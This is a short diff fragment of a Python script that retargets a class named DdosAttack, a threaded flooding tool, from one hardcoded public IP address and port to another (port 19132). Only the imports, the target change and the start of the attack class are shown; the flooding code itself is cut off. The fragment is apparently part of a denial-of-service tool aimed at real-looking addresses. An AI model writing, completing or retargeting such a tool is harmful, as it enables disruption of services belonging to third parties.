@@ -4,8 +4,8 @@ import threading
 import time
 import os
 
-ip = "139.162.17.33"
-port = 22
+ip = "34.87.43.93"
+port = 19132
 
 class DdosAttack(threading.Thread):
 	def run(self):
